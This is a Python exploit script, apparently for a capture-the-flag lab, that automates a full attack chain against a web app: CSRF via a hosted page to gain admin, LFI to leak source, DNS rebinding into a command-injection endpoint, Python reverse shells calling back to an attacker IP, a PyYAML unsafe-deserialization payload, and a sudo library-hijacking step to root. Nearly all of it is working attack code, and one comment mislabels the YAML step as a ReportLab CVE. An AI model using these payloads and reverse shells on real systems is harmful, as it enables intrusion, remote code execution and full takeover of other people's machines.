import requests
import sys
import threading
from http.server import HTTPServer, BaseHTTPRequestHandler
import re
import time

# Configuration
URL = "http://127.0.0.1"       # MATCHING bot.py login domain (Crucial for cookies)
ATTACKER_IP = "10.100.100.1"   # IP of the machine running this script (reachable by Container for HTTP)
ATTACKER_PORT = 8000           # Port to host the CSRF payload
USERNAME = "attacker"
PASSWORD = "password123"

# Reverse Shell Configuration (Can be ngrok or local IP)
REV_SHELL_HOST = "10.100.100.1" 
REV_SHELL_PORT = 1338

# CSRF to promote user to admin 
# Changed to GET (Image/Redirect) because SameSite cookie policies often block POST
# URL must use 127.0.0.1 because that's where the bot logged in and has cookies.
CSRF_PAYLOAD = f"""
<html>
  <body>
    <h1>Redirecting...</h1>
    <script>
       // Top-level navigation allows SameSite=Lax cookies (unlike subresources like img/fetch)
       window.location.href = "{URL}/make_admin?username={USERNAME}";
    </script>
  </body>
</html>
"""

class CSRFHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(CSRF_PAYLOAD.encode())
        print(f"[+] Served CSRF payload to {self.client_address[0]}")

def start_server():
    try:
        server_address = ('0.0.0.0', ATTACKER_PORT)
        httpd = HTTPServer(server_address, CSRFHandler)
        print(f"[+] Serving CSRF payload on port {ATTACKER_PORT}...")
        httpd.handle_request() 
    except Exception as e:
        print(f"[-] Server error: {e}")

def main():
    if len(sys.argv) > 1:
        global ATTACKER_IP
        ATTACKER_IP = sys.argv[1]
    
    # NOTE: The exploit script interacts with the app from OUTSIDE (using ATTACKER_IP or localhost mapping)
    # BUT the CSRF payload executes INSIDE the bot's browser.
    # So 'URL' for requests here should be reachable from this script (Attacker machine).
    # 'URL' for CSRF payload should be reachable from the Bot (127.0.0.1).
    
    # Let's handle this distinction.
    # We'll assume the attacker can reach the app via 'localhost' or '127.0.0.1' on the host, 
    # but strictly speaking, the script uses 'URL' for both registration AND CSRF payload src.
    # Since the bot and app are on the same machine/network usually in this CTF setup (or mapped ports),
    # 127.0.0.1 works for both if running locally.
    
    print(f"[*] Attacker IP set to: {ATTACKER_IP} (Ensure this is reachable from the Docker container)")
    print("[*] Starting Exploit Chain...")

    s = requests.Session()

    # 1. Register Attacker
    print("[*] Registering attacker...")
    try:
        # Use localhost or 127.0.0.1 here (Attacker -> App)
        # Using 127.0.0.1 is safe if port 80 is forwarded.
        s.post(f"{URL}/register", data={
            "username": USERNAME,
            "email": "attacker@evil.com",
            "password": PASSWORD
        })
    except:
        pass 

    # 2. Login
    print("[*] Logging in...")
    s.post(f"{URL}/login", data={
        "username": USERNAME,
        "password": PASSWORD
    })

    # 3. Start Exploit Server in Thread
    server_thread = threading.Thread(target=start_server)
    server_thread.start()
    time.sleep(1) 

    # 4. Send Report with Malicious Link (CSRF)
    malicious_link = f"http://{ATTACKER_IP}:{ATTACKER_PORT}/csrf.html"
    print(f"[*] Sending malicious link: {malicious_link}")
    
    try:
        s.post(f"{URL}/report", data={
            "url": malicious_link
        })
        print("[*] Waiting for Admin Bot (3s)...")
        time.sleep(3) # Wait for bot
    except:
        print("[-] Report submission failed")

    # 5. Check if Admin
    print("[*] Checking admin status...")
    res = s.get(f"{URL}/admin")
    if "External Link Scanner" in res.text:
        print("[+] SUCCESS! We are Admin.")
    else:
        print("[-] Failed to access Admin panel via CSRF.")
        print("    Note: Verify 'ATTACKER_IP' is correct and reachable from the container.")

    # 6. Exploit LFI to leak Source Code
    print("\n[*] Step 2: Accessing System Logs (LFI) to leak source code...")
    res = s.get(f"{URL}/admin", params={"logfile": "main.py"})
    
    if "def healthcheck():" in res.text:
        print("[+] LFI Successful! Found 'healthcheck' endpoint in source code.")
    else:
        print("[-] LFI Failed or main.py not found/readable.")

    # 7. DNS Rebinding Attack
    print("\n[*] Step 3: DNS Rebinding Attack (Automated)")
    # Domain that alternates between 8.8.8.8 (or any public IP) and 127.0.0.1
    # You might need to generate a new specific one from https://lock.cmpxchg8b.com/rebinder.html
    # This one is hardcoded for the example: 7f000001.08080808.rbndr.us
    # 7f000001 = 127.0.0.1, 08080808 = 8.8.8.8
    # NOTE: User provided 7f000001.08080808.rbndr.us
    REBIND_DOMAIN = "7f000001.08080808.rbndr.us"
    # Use Python reverse shell since container has python3 (WebApp)
    # Payload: export RHOST="{REV_SHELL_HOST}";export RPORT=1337;...
    
    print(f"[*] IMPORTANT: Start your listener for WebApp shell: nc -nlvp 1337")
    
    # URL encoded
    rev_shell = f"export RHOST=\"{REV_SHELL_HOST}\";export RPORT=1337;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"bash\")'"
    from urllib.parse import quote
    encoded_cmd = quote(rev_shell)
    target_url = f"http://{REBIND_DOMAIN}/healthcheck?cmd={encoded_cmd}"
    
    print(f"[*] Targeting: {target_url}")
    print("[*] Spamming requests to win the race condition...")
    
    found = False
    for i in range(20): # Increased tries for race condition reliability
        try:
            # We want the admin panel to fetch our target_url
            res = s.get(f"{URL}/admin", params={"url": target_url})
            
            # Check if we got the RCE result
            if "System Status: OK" in res.text or "uid=" in res.text or "root" in res.text:
                print(f"[+] SUCCESS! Rebinding worked on attempt {i+1}")
                if "Scanner Output:" in res.text:
                    start = res.text.find("Scanner Output:")
                    print(res.text[start:start+300]) 
                else:
                    print(res.text[:300])
                found = True
                break
            else:
                 pass
        except Exception as e:
            print(f"Error: {e}")
            
    if not found:
        print("\n[-] Attack failed. Check container logs.")
    
    # 8. ReportLab CVE-2023-33733 Payload
    print("\n[*] Step 4: Pivoting to Internal Config Service (PyYAML Consumed)")
    print("The internal service runs PyYAML 5.3.1 (Vulnerable to Unsafe Deserialization).")
    
    # Payload: !!python/object/apply:os.system ["command"]
    # We want to run a reverse shell or exfiltrate the flag.
    # Since we have the webapp shell, we can just cat the flag to a public location? 
    # Or trigger a reverse shell back to us.
    
    # Let's do a reverse shell to port 1338 (different from webapp shell if needed)
    # Payload needs to be proper YAML.
    
    print(f"\n[+] To exploit the Internal Service, run this command from the WebApp Shell:")
    print("-" * 60)
    
    # We'll use the same python one-liner for reliability
    # Using specific REV_SHELL variables allows support for ngrok/VPNs
    rev_shell_cmd = f"export RHOST=\"{REV_SHELL_HOST}\";export RPORT={REV_SHELL_PORT};python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/bash\")'"
    
    # We need to adhere to YAML syntax.
    # !!python/object/apply:os.system ["cmd"]
    
    # To avoid quoting hell and Bash history expansion (!!), we use a HEREDOC for the raw payload.
    # We must escape the double quotes inside the command string for YAML syntax.
    rev_shell_cmd_escaped = rev_shell_cmd.replace('"', '\\"')
    yaml_payload = f"!!python/object/apply:os.system [\"{rev_shell_cmd_escaped}\"]"
    
    print(f"# 1. Start a listener on your machine: nc -nlvp {REV_SHELL_PORT}")
    print(f"#    (Or ensure ngrok is running on this port mapping)")
    print(f"# 2. Verify Vulnerability (Optional):")
    print(f"curl -X POST -H 'Content-Type: text/plain' -d '[' http://internal_service:5000/process_config")
    print(f"# Should return: 'YAML Config Error: ...'")
    print(f"\n# 3. Run this on the compromised WebApp (Paste the whole block):")
    
    print(f"curl -H 'Content-Type: text/plain' -X POST http://internal_service:5000/process_config --data-binary @- <<'EOF'")
    print(yaml_payload)
    print("EOF")
    print("-" * 60)
    
    print("\n[*] Step 5: Privilege Escalation (Python Library Hijacking)")
    print("Scenario: 'sudo -l' reveals you can run: (root) NOPASSWD: /usr/local/bin/python /app/cleanup.py")
    print("The script /app/cleanup.py imports 'shutil'. Since /app is writable (where we are), we can hijack it.")
    
    print("\n[+] To get ROOT, run these commands inside your Reverse Shell:")
    print("-" * 60)
    print("# 1. Check sudo rights")
    print("sudo -l")
    print("\n# 2. Create malicious shutil.py")
    print("echo 'import os; os.system(\"/bin/bash\")' > /app/shutil.py")
    print("\n# 3. Trigger the exploit")
    print("sudo /usr/local/bin/python /app/cleanup.py")
    print("\n# 4. You should be root!")
    print("cat /root/flag.txt")
    print("-" * 60)

if __name__ == "__main__":
    main()
